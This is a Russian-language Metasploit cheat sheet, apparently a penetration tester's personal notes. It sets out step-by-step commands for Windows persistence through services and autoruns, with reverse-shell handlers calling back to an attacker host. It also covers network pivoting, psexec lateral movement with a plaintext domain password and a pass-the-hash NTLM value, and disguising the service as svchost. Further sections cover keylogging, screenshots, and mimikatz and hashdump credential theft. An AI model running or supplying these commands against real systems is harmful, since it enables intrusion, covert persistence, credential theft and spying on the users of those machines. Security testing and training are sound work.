## Metasploit
Все изложенное проверено на работоспособность в Kali2020.04

# Полезные параметры

`exploit -j` позволяет запускать модуль в background (jobify)

`exploit -z` запускает сессию в background (не понял в чем отличие от _-j_)

`jobs` просмотреть список задать в background

`sessions -l` посмотреть список открытых сессий 

`show advanced` просмотреть дополнительные параметры для модуля

`getprivs` посмотреть привилегии

Сочетание команд, позволяет хендлеру продолжать работать после создания сессии.

`set ExitOnSession False` 
`run -jz`

# Инициализация базы данных для сохранение информации

1. Запустить postgresql.

`systemctl start postgresql`

`systemctl enable postgresql`

2. Инициализация БД 

`msfdb init`

3. Смена пароля пользователя msf

`sudo -u postgres psql`

`postgres=#alter user msf password '123456';`

4. Проверка подключения

`msf5 > db_connect msf:123456@localhost/msf`

5. Автоматическое подключение msf к БД и смена пароля.

`nano /usr/share/metasploit-framework/config/database.yml`

# Persistence 

## Windows

*Service*
Target setting:

`search persistence`

`use exploit/windows/local/persistence_service`

`set session 2`

`set lport 4245` - optional

`exploit` 

Handler setting:

`use exploit/multi/handler`

`set payload windows/meterpreter/reverse_tcp`

`set lhost 192.168.0.115`

`set lport 4245`

`exploit`

*Autoruns*

Target setting:

`use exploit/windows/local/registry_persistence`

`set session 1`

`set lport 7654`

`exploit`

Handler setting:

`use exploit/multi/handler`

`set payload windows/meterpreter/reverse_tcp`

`set lhost 192.168.0.115`

`set lport 7654`

`exploit`

# Проброс во внутренюю сеть (pivoting).

1. Используем модуль ssh_login для захода на пограничный узел.

2. Преобразуем ssh-сессию в сессию meterpreter 

`session -u <session_num>`

3.1 Выходим из сессии meterpreter-а и используем для неё _post/multi/manage/autoroute_

`post/multi/manage/autoroute`

`set SESSION 8`

`set SUBNET 10.100.36.0`

`run`

3.2 Передаем параметры прям из сессии meterpreter

`run post/multi/manage/autoroute SUBNET=10.100.36.0 CMD=add`

4.1 Если надо распечатать текущий статут autoroute:

`set CMD print`

`run`

4.2 Альтернативный вариант

`msf6 exploit(windows/smb/psexec) > route print`

# smb_login или psexec модули 

## Доступ по паролю

*Если в Windows включена "Защита в режиме реального времени", то создания сессии не происходит.*

`use windows/smb/psexec`

`set RHOST 10.100.36.7`

`set SMBDomain company.ru`

`set SMBPass Qwerty2020`

`set SMBUser eborisenko`

*Необходимо проверить payload. Если Windows x64, то его требуется сменить.*

`set PAYLOAD payload/windows/x64/meterpreter/reverse_tcp`

`run`

## Доступ по ntlm-хешу.

Если доступен ntlm-хеш, то к нему в начало надо добавить заглушку в виде нулевого LM-хеша

`set SMBPass 00000000000000000000000000000000:7661de2ec1fe5de9d91da21375bc618d`

Преобразование сессии meterpreter в cmd.exe.

`shell`

## Тонкая настройка

`show advanced` - показывает дополнительные параметры модули я payload

По умолчанию SERVICE_FILENAME псевдослучайное, можно переименовать, например, svchost.

`set SERVICE_FILENAME svchost`

# Получение скриншотов 

## Через получение system

1. Получаем права псевдопользователя system:

`getsystem` 

2. Снять скриншот.

`screenshot`

## Через нужные процесс 
1. Перемещение в нужный процесс (explorer.exe)

`migrate 260`

2. Снять скриншот.

`screenshot`

*Замечание* обратный переезд зависит от прав, с которыми запущен целевой процесс (explorer.exe с правами авторизованного пользователя)

# Кейлоггинг
1. Перемещение в процесс explorer.exe.

`migrate 260`

2. Запустить запись символов

`keyscan_start`

3. Посмотреть что получилось.

`keyscan_dump`

4. Завершить.

`keyscan_stop`

# Creds dump

1. *Mimikatz.* Из сессии meterpreter нужной разрядность (!) выполняем команду для загрузки mimikatz:

meterpreter > sysinfo
Computer        : WINDOWS10
OS              : Windows 10 (10.0 Build 17134).
Architecture    : *x64*
System Language : en_US
Domain          : SEC560
Logged On Users : 2
Meterpreter     : *x64*/windows

Если сессия не той разрядности, мигрируем в процесс с нужной разрядностью, запущенный от SYSTEM.

`meterpreter > ps -A x64 -s`

`load kiwi`

`creds_all`

2. *smart_hashdump.* This module is smart and will dump password hashes differently depending on the target system's role. If the target is a domain controller, it will pull passwords differently and from a dfferent location. 

`info post/windows/gather/smart_hashdump`

Запускаем прям в сессии meterpreter

`meterpreter > run post/windows/gather/smart_hashdump`


# Перемещение по диску

`pwd` - вывод текущей директории

`ls` - список файлов

# Если shell не работает, то есть альтернативный варинт

`execute -f cmd.exe -c`

`channel -i <N>`

# Запуск .rc-скрипта 

`msfconsole -r /var/lib/veil/output/handlers/veilpayload.rc`


